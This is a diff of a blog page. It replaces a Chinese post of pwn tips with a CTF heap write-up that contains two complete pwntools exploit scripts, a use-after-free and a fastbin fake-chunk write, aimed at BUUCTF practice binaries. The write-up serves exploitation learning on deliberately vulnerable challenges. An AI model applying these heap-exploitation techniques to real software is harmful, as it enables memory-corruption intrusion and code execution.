@@ -20,20 +20,20 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="脑力有限，本文旨在存储Pwn题中的雷区与奇技淫巧">
+  <meta name="description" content="做题留Wp是好习惯XD">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Some tricks in Pwn">
-<meta property="og:url" content="http://example.com/2023/08/04/Some%20tricks%20in%20Pwn/index.html">
+<meta property="og:title" content="赛棍のHeap刷题之路">
+<meta property="og:url" content="http://example.com/2023/08/15/%E8%B5%9B%E6%A3%8D%E3%81%AEHeap%E5%88%B7%E9%A2%98%E4%B9%8B%E8%B7%AF/index.html">
 <meta property="og:site_name" content="Gap&#39;s_Blog">
-<meta property="og:description" content="脑力有限，本文旨在存储Pwn题中的雷区与奇技淫巧">
+<meta property="og:description" content="做题留Wp是好习惯XD">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-08-04T13:37:00.000Z">
-<meta property="article:modified_time" content="2023-08-14T06:37:24.274Z">
+<meta property="article:published_time" content="2023-08-15T13:44:00.000Z">
+<meta property="article:modified_time" content="2023-08-15T16:23:20.610Z">
 <meta property="article:author" content="Gap">
-<meta property="article:tag" content="tricks">
+<meta property="article:tag" content="WriteUp, Heap">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="http://example.com/2023/08/04/Some%20tricks%20in%20Pwn/">
+<link rel="canonical" href="http://example.com/2023/08/15/%E8%B5%9B%E6%A3%8D%E3%81%AEHeap%E5%88%B7%E9%A2%98%E4%B9%8B%E8%B7%AF/">
 
 
 <script id="page-configurations">
@@ -46,7 +46,7 @@
   };
 </script>
 
-  <title>Some tricks in Pwn | Gap's_Blog</title>
+  <title>赛棍のHeap刷题之路 | Gap's_Blog</title>
   
 
 
@@ -188,7 +188,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/04/Some%20tricks%20in%20Pwn/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/08/15/%E8%B5%9B%E6%A3%8D%E3%81%AEHeap%E5%88%B7%E9%A2%98%E4%B9%8B%E8%B7%AF/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -201,7 +201,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Some tricks in Pwn
+          赛棍のHeap刷题之路
         </h1>
 
         <div class="post-meta">
@@ -211,14 +211,14 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2023-08-04 21:08:00" itemprop="dateCreated datePublished" datetime="2023-08-04T21:37:00+08:00">2023-08-04</time>
+              <time title="创建时间：2023-08-15 21:08:00" itemprop="dateCreated datePublished" datetime="2023-08-15T21:44:00+08:00">2023-08-15</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-08-14 14:08:27" itemprop="dateModified" datetime="2023-08-14T14:37:24+08:00">2023-08-14</time>
+                <time title="修改时间：2023-08-16 00:08:61" itemprop="dateModified" datetime="2023-08-16T00:23:20+08:00">2023-08-16</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -249,81 +249,42 @@
 
       
         <blockquote class="blockquote-center">
-脑力有限，本文旨在存储Pwn题中的雷区与奇技淫巧
+做题留Wp是好习惯XD
 </blockquote>
 <span id="more"></span>
-<hr />
-<h1 id="x01-雷区">0x01 雷区</h1>
-<h3 id="some-bugs-in-ida">1. Some bugs in IDA</h3>
+<h1 id="x00-content">0x00 Content</h1>
 <ol type="1">
-<li>当点进StackView发现对应区域没有变量名时，动调看偏移。
-<ol type="1">
-<li>原因：IDA会分析错误</li>
-<li>例题：buuctf - cmcc_simplerop</li>
-</ol></li>
-<li>IDA显示的函数变量有可能与pwndbg显示的有区别</li>
+<li>hitcontraining_uaf</li>
+<li>hitcontraining_magicheap</li>
 </ol>
-<h3 id="system参数">2. system参数</h3>
-<ol type="1">
-<li>system的参数应该是一个地址，这个地址指向字符串"/bin/sh"</li>
-</ol>
-<h3 id="位与64位格式化字符串漏洞">3. 32位与64位格式化字符串漏洞</h3>
-<ol type="1">
-<li>32位：%s不能放在地址前面，由于32位地址不存在，所以printf会打印一堆相邻的以f7开头的地址，此时获取的地址并不会是你想要的地址</li>
-<li>64位：%s不能放在地址后面，由于64位地址存在，所以printf会截断数据，并不会打印到%s的位置</li>
-</ol>
-<h3 id="send-recv">4. send &amp; recv</h3>
-<ol type="1">
-<li>send尽量after</li>
-</ol>
-<h3 id="libc不同可能导致的后果">5. libc不同可能导致的后果</h3>
-<ol type="1">
-<li>栈偏移量不同</li>
-<li>tcache的存在使部分堆攻击变难</li>
-</ol>
-<h3 id="栈劫持">6. 栈劫持</h3>
-<ol type="1">
-<li>有的时候bss段上面是got表，如果栈没调整好则push多了以后会覆盖got表导致不能调用
-<ol type="1">
-<li>例题：buu - gyctf_2020_borrowstack</li>
-</ol></li>
-</ol>
-<hr />
-<h1 id="x02-奇技淫巧">0x02 奇技淫巧</h1>
-<h3 id="ropgadget---binary-filename---ropchain">1. ROPgadget --binary
-filename --ropchain</h3>
-<ol type="1">
-<li>作用：静态编译时，二进制文件会自带许多gadget，该命令用于提取</li>
-<li>trick：可以自己修改它生成的chain，缩短shellcode</li>
-<li>例题：buuctf - cmcc_simplerop | inndy_rop</li>
-</ol>
-<h3 id="重复栈">2. 重复栈</h3>
-<ol type="1">
-<li>原理：已知main函数中先调用函数A，再调用函数B。则AB使用的栈空间重叠，在A中使用的栈并不会被擦除，所以可能会通过B再次利用</li>
-<li>例题：[ZJCTF 2019]Login</li>
-</ol>
-<h3 id="关闭标准输出">3. 关闭标准输出</h3>
-<ol type="1">
-<li>原理：看这篇<a
-target="_blank" rel="noopener" href="https://blog.csdn.net/xirenwang/article/details/104139866">博客</a></li>
-</ol>
-<h3 id="int-0x80h">4. int 0x80h</h3>
-<ol type="1">
-<li>寄存器与数据的关系
-<ol type="1">
-<li>EAX/RAX：系统调用号</li>
-<li>EDX/RDX：输入长度</li>
-</ol></li>
-<li>系统调用号记录</li>
-<li>系统调用sys_read是直接从ESP开始向下写入，而不是常规的push
-<ol type="1">
-<li>例题：buuctf - pwnable_start</li>
-</ol></li>
-</ol>
-<hr />
-<h1 id="x03-工具使用">0x03 工具使用</h1>
-<h3 id="fmtstr_payload">1. fmtstr_payload</h3>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fmtstr_payload(offset, writes, numbwritten=0, write_size=&#x27;byte&#x27;)</span><br><span class="line"></span><br><span class="line">第一个参数表示格式化字符串的偏移</span><br><span class="line"></span><br><span class="line">第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成&#123;printfGOT:systemAddress&#125;；</span><br><span class="line"></span><br><span class="line">第三个参数表示已经输出的字符个数</span><br><span class="line"></span><br><span class="line">第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="x01-hitcontraining_uaf">0x01 hitcontraining_uaf</h1>
+<blockquote>
+<p>Ⅰ. 所用知识点： 1.
+逆向分析（这个题逆向太坐牢了，pseudocode太恶心，只能一点一点看） 2.
+利用fastbin性质实现 3. UAF</p>
+</blockquote>
+<p>Ⅱ. EXP <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">domain_name = &#x27;node4.buuoj.cn&#x27;</span><br><span class="line">port = 25676</span><br><span class="line">file = &#x27;./hacknote&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"># io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./hacknote&#x27;)</span><br><span class="line"># libc = ELF(&#x27;./libc_repo2elf/libc-2.23.so&#x27;)</span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(size,content):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;size :&#x27;, str(size))</span><br><span class="line">  io.sendlineafter(&#x27;Content :&#x27;,content)</span><br><span class="line">  </span><br><span class="line">def delete(index):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;, str(index))</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">def print(index):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;,str(index))</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">alloc(0x10,&#x27;aaaa&#x27;)</span><br><span class="line">alloc(0x10,&#x27;aaaa&#x27;)</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">get_shell = 0x8048945</span><br><span class="line">alloc(0x8,p32(get_shell))</span><br><span class="line">print(0)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>Ⅲ. 解题感言
+这个题该说是出的很灵活还是很逆天...想要发现利用点需要比较扎实的逆向功底才行。其次还要对fastbin对于不同大小的chunk的分配问题有比较深入的了解。</p>
+<h1 id="x02-hitcontraining_magicheap">0x02 hitcontraining_magicheap</h1>
+<blockquote>
+<p>Ⅰ. 所用知识点 1. 利用fastbin的FFSL进行任意地址写</p>
+</blockquote>
+<p>Ⅱ. EXP <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">domain_name = &#x27;node4.buuoj.cn&#x27;</span><br><span class="line">port = 29259</span><br><span class="line">file = &#x27;./magicheap&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"># io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./magicheap&#x27;)</span><br><span class="line"># libc = ELF(&#x27;./libc_repo2elf/libc-2.23.so&#x27;)</span><br><span class="line"></span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(size,content):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;Heap : &#x27;, str(size))</span><br><span class="line">  io.sendlineafter(&#x27;heap:&#x27;,content)</span><br><span class="line"></span><br><span class="line">def edit(index,size,content):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;, str(index))</span><br><span class="line">  io.sendlineafter(&#x27;Heap : &#x27;, str(size))</span><br><span class="line">  io.sendlineafter(&#x27;heap : &#x27;,content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">  io.sendlineafter(&#x27;choice :&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;, str(index))</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">fake_chunk = 0x60208d</span><br><span class="line">alloc(0x10,&#x27;\x00&#x27;)</span><br><span class="line">alloc(0x60,&#x27;\x00&#x27;)</span><br><span class="line">alloc(0x40,&#x27;\x00&#x27;)</span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">payload = p64(0)*3 + p64(0x71) + p64(fake_chunk)</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line"></span><br><span class="line">alloc(0x60,&#x27;aaaa&#x27;)</span><br><span class="line">alloc(0x60,&#x27;aaaaaaaa&#x27;)</span><br><span class="line">io.sendline(str(4869))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"> </span><br></pre></td></tr></table></figure></p>
+<p>Ⅲ. 解题感言 四道堆题了，这是第一道自己做出来的堆题
+我做Pwn的整体习惯是边打边学，没有说是先学再打 这道题整体感觉跟[ZJCTF
+2019]EasyHeap非常像，不过133t函数里藏的是真flag，不用去泄露libc地址劫持malloc_hook了
+因为特别像所以就考虑用fastbin
+attack打，事实上我到现在也不太清楚这算不算fastbin attack
+只是利用了堆溢出和从fastbin里申请chunk的特性进行了一个任意地址的写
+解决了babyheap那道题里不清楚的一个点(为什么在0x..aed申请fake_chunk)
+这道题网上还有unsortedbin attack，抽空学一下 # 0xNaN 堆的杂七杂八总结
+&gt; Read Address 1. 任意地址读 2. 泄露libc 1. unsorted bin --- Single
+chunk in unsorted bin（SCUB）</p>
+<blockquote>
+<p>Write Address 1. 任意地址写 1. fastbin --- Fake fd in
+single-linklist（FFSL）</p>
+</blockquote>
 
     </div>
 
@@ -339,7 +300,7 @@ target="_blank" rel="noopener" href="https://blog.csdn.net/xirenwang/article/det
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="http://example.com/2023/08/04/Some%20tricks%20in%20Pwn/" title="Some tricks in Pwn">http://example.com/2023/08/04/Some tricks in Pwn/</a>
+    <a href="http://example.com/2023/08/15/%E8%B5%9B%E6%A3%8D%E3%81%AEHeap%E5%88%B7%E9%A2%98%E4%B9%8B%E8%B7%AF/" title="赛棍のHeap刷题之路">http://example.com/2023/08/15/赛棍のHeap刷题之路/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -360,7 +321,7 @@ target="_blank" rel="noopener" href="https://blog.csdn.net/xirenwang/article/det
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/tricks/" rel="tag"># tricks</a>
+              <a href="/tags/WriteUp-Heap/" rel="tag"># WriteUp, Heap</a>
           </div>
 
         
@@ -369,13 +330,10 @@ target="_blank" rel="noopener" href="https://blog.csdn.net/xirenwang/article/det
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2023/01/10/Hexo%20&%20Next%E9%85%8D%E7%BD%AE/" rel="prev" title="Hexo & Next 博客配置与美化">
-      <i class="fa fa-chevron-left"></i> Hexo & Next 博客配置与美化
+    <a href="/2023/08/14/BUUCTF%20babyheap_0ctf_2017/" rel="prev" title="BUUCTF babyheap_0ctf_2017">
+      <i class="fa fa-chevron-left"></i> BUUCTF babyheap_0ctf_2017
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2023/08/04/%E5%BC%82%E4%B8%96%E7%95%8C%E8%A7%81%E9%97%BB%E5%BD%95(1)/" rel="next" title="异世界见闻录(1)">
-      异世界见闻录(1) <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -434,8 +392,7 @@ target="_blank" rel="noopener" href="https://blog.csdn.net/xirenwang/article/det
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#x01-%E9%9B%B7%E5%8C%BA"><span class="nav-number">1.</span> <span class="nav-text">0x01 雷区</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#some-bugs-in-ida"><span class="nav-number">1.0.1.</span> <span class="nav-text">1. Some bugs in IDA</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#system%E5%8F%82%E6%95%B0"><span class="nav-number">1.0.2.</span> <span class="nav-text">2. system参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%8D%E4%B8%8E64%E4%BD%8D%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.0.3.</span> <span class="nav-text">3. 32位与64位格式化字符串漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#send-recv"><span class="nav-number">1.0.4.</span> <span class="nav-text">4. send &amp; recv</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#libc%E4%B8%8D%E5%90%8C%E5%8F%AF%E8%83%BD%E5%AF%BC%E8%87%B4%E7%9A%84%E5%90%8E%E6%9E%9C"><span class="nav-number">1.0.5.</span> <span class="nav-text">5. libc不同可能导致的后果</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%E5%8A%AB%E6%8C%81"><span class="nav-number">1.0.6.</span> <span class="nav-text">6. 栈劫持</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#x02-%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7"><span class="nav-number">2.</span> <span class="nav-text">0x02 奇技淫巧</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ropgadget---binary-filename---ropchain"><span class="nav-number">2.0.1.</span> <span class="nav-text">1. ROPgadget --binary
-filename --ropchain</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%87%8D%E5%A4%8D%E6%A0%88"><span class="nav-number">2.0.2.</span> <span class="nav-text">2. 重复栈</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E9%97%AD%E6%A0%87%E5%87%86%E8%BE%93%E5%87%BA"><span class="nav-number">2.0.3.</span> <span class="nav-text">3. 关闭标准输出</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#int-0x80h"><span class="nav-number">2.0.4.</span> <span class="nav-text">4. int 0x80h</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#x03-%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">0x03 工具使用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#fmtstr_payload"><span class="nav-number">3.0.1.</span> <span class="nav-text">1. fmtstr_payload</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#x00-content"><span class="nav-number">1.</span> <span class="nav-text">0x00 Content</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#x01-hitcontraining_uaf"><span class="nav-number">2.</span> <span class="nav-text">0x01 hitcontraining_uaf</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#x02-hitcontraining_magicheap"><span class="nav-number">3.</span> <span class="nav-text">0x02 hitcontraining_magicheap</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
